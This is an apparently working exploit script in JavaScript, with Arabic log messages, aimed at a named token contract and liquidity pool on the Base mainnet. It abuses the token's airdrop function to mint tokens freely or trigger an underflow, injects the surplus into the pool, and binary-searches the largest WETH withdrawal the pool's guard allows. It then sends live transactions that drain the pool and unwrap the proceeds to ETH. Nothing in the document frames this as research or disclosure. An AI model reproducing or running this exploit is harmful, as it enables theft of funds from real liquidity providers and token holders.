import fs from "node:fs";
import { JsonRpcProvider, Wallet, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const DRY = process.env.DRY === "1";

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66, 130), 16); return Buffer.from(d.slice(130, 130 + n * 2), "hex").toString(); } catch { return "?"; } };
const sim = async (lbl, to, data, ov) => {
  const pr = [{ from: ME, to, data, gas: "0x90000" }, "latest"];
  if (ov) pr.push(ov);
  const r = await j("eth_call", pr);
  console.log((r.error ? "✗ " : "✓ ") + lbl + (r.error ? "  " + dec(r.error.data) : ""));
  return !r.error;
};

let ME, IS_WETH_0;
const rv0 = async () => (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  ME = me.address;

  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);
  const mf = base * 3n / 2n + 1000000n;
  const FEE = { maxFeePerGas: mf, maxPriorityFeePerGas: 0n };
  const send = async (to, data, gas) => {
    for (let i = 0; i < 3; i++) {
      try { const rc = await (await me.sendTransaction({ to, data, gasLimit: gas, ...FEE })).wait(); if (rc.status === 1) return rc; }
      catch (e) { console.log("   خطأ:", (e.shortMessage || e.message).slice(0, 70)); }
      if (i < 2) await new Promise(r => setTimeout(r, 9000));
    }
    return null;
  };

  const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
  const tk1 = "0x" + (await j("eth_call", [{ to: P, data: "0xd21220a7" }, "latest"])).result.slice(-40).toLowerCase();
  IS_WETH_0 = tk0 === W.toLowerCase();
  if (!IS_WETH_0 && tk1 !== W.toLowerCase()) { console.log("WETH ليس في الحوض", tk0, tk1); return; }
  const wIdx = IS_WETH_0 ? 0 : 1;

  const rv = await rv0();
  const r0 = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
  const rW = IS_WETH_0 ? r0 : r1;
  const rS = IS_WETH_0 ? r1 : r0;
  const bal = await bn(T, "0x70a08231" + pad(ME));
  const balP = await bn(T, "0x70a08231" + pad(P));
  const eth = await p.getBalance(ME);
  const sur = balP > rS ? balP - rS : 0n;

  console.log("token0:", tk0, IS_WETH_0 ? "(WETH)" : "", "| token1:", tk1);
  console.log("ETH:", formatEther(eth), "| SLOP:", formatUnits(bal, 9), "| WETH بالحوض:", formatEther(rW), "| SLOP بالحوض:", formatUnits(rS, 9));
  if (rW === 0n) { console.log("لا WETH"); return; }

  const tgt = rW * 97n / 100n;
  const need = rS * tgt * 1000n / (997n * (rW - tgt)) + 1n;
  const mk = amt => "0x983bc41b" + w32(0x60) + pad(ME) + w32(amt) + w32(1) + pad(P);

  console.log("\n=== السقف ===");
  let IN, drop, mode;
  if (await sim("airdrop " + formatUnits(need * 110n / 100n, 9) + " SLOP", T, mk(need * 110n / 100n))) {
    IN = need * 110n / 100n; drop = mk(IN); mode = "سك مجاني";
  } else if (await sim("airdrop ضعف رصيدك", T, mk(bal * 2n))) {
    IN = bal * 2n; drop = mk(IN); mode = "underflow";
  } else if (await sim("airdrop رصيدك", T, mk(bal))) {
    IN = bal; drop = mk(IN); mode = "محدود";
  } else { console.log("airdrop لا يمر"); return; }

  const ov = { [T]: { stateDiff: { [slot(P, 1)]: "0x" + (balP + IN).toString(16).padStart(64, "0") } } };
  const mkSwap = o => "0x022c0d9f" + (wIdx === 0 ? w32(o) + w32(0) : w32(0) + w32(o)) + pad(ME) + w32(0x80) + w32(0);
  const ok = async o => !(await j("eth_call", [{ from: ME, to: P, data: mkSwap(o), gas: "0x90000" }, "latest", ov])).error;

  const tot = sur + IN;
  const theo = tot * 997n * rW / (rS * 1000n + tot * 997n);
  let hi = theo < rW - 1n ? theo : rW - 1n;
  console.log("الوضع:", mode, "| نظري:", formatEther(theo), "WETH | الحارس:", formatEther(rW * 93n / 100n));

  let lo = 1n, best = 0n;
  for (let i = 0; i < 48 && lo <= hi; i++) {
    const mid = (lo + hi) / 2n;
    if (await ok(mid)) { best = mid; lo = mid + 1n; } else hi = mid - 1n;
  }
  if (best === 0n) { console.log("لا قيمة تمر — الحارس أشد من المتوقع"); return; }
  const out = best * 998n / 1000n;
  console.log(">>> أقصى مخرج مقبول:", formatEther(best), "WETH (" + (best * 100n / rW).toString() + "% من الاحتياطي) → سنستخدم", formatEther(out));

  const cost = (95000n + 200000n + 50000n) * mf;
  console.log("\nغاز:", formatEther(cost), "| متاح:", formatEther(eth), "| maxFee:", mf.toString());
  if (eth < cost) { console.log("ناقص " + formatEther(cost - eth) + " ETH فقط"); return; }
  if (DRY) { console.log("جاهز."); return; }

  console.log("\n1) ضخ الفائض...");
  if (!await send(T, drop, 95000n)) return;
  const pNow = await bn(T, "0x70a08231" + pad(P));
  const inNow = pNow - rS;
  console.log("   فائض:", formatUnits(inNow, 9));
  if (inNow <= 0n) { console.log("   لا فائض"); return; }

  const rv2 = await rv0();
  const a0 = BigInt("0x" + rv2.slice(2, 66)), a1 = BigInt("0x" + rv2.slice(66, 130));
  const wNow = IS_WETH_0 ? a0 : a1, sNow = IS_WETH_0 ? a1 : a0;
  const th2 = inNow * 997n * wNow / (sNow * 1000n + inNow * 997n);
  let h2 = th2 < wNow - 1n ? th2 : wNow - 1n;
  const okLive = async o => !(await j("eth_call", [{ from: ME, to: P, data: mkSwap(o), gas: "0x90000" }, "latest"])).error;
  let l2 = 1n, b2 = 0n;
  for (let i = 0; i < 48 && l2 <= h2; i++) {
    const mid = (l2 + h2) / 2n;
    if (await okLive(mid)) { b2 = mid; l2 = mid + 1n; } else h2 = mid - 1n;
  }
  if (b2 === 0n) { console.log("   الحارس رفض كل القيم على الحالة الحقيقية"); return; }
  const o2 = b2 * 998n / 1000n;
  console.log("2) سحب", formatEther(o2), "WETH...");
  if (!await send(P, mkSwap(o2), 200000n)) return;

  const wb = await bn(W, "0x70a08231" + pad(ME));
  console.log("   WETH عندك:", formatEther(wb));
  if (wb > 0n) { console.log("3) فك إلى ETH..."); await send(W, "0x2e1a7d4d" + w32(wb), 50000n); }
  console.log("\n>>> ETH عندك:", formatEther(await p.getBalance(ME)), "| WETH متبقٍ بالحوض:", formatEther(await bn(W, "0x70a08231" + pad(P))));
}
main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
